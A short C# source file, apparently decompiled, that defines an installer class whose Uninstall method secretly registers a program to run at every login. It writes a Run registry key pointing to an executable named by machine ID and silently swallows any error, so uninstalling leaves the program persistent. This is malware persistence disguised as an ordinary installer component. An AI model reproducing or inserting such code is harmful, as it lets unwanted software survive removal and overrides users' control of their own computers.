using System;
using System.Collections;
using System.ComponentModel;
using System.Configuration.Install;
using Microsoft.Win32;
using abc;

[RunInstaller(true)]
public class Sample : Installer
{
	public override void Uninstall(IDictionary savedState)
	{
		try
		{
			if (!Form1.isAutoStart())
			{
				Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(Form1.getMachineID(), Form1.userDir + Form1.getMachineID() + "\\" + Form1.PE_NAME);
			}
		}
		catch (Exception)
		{
		}
	}
}
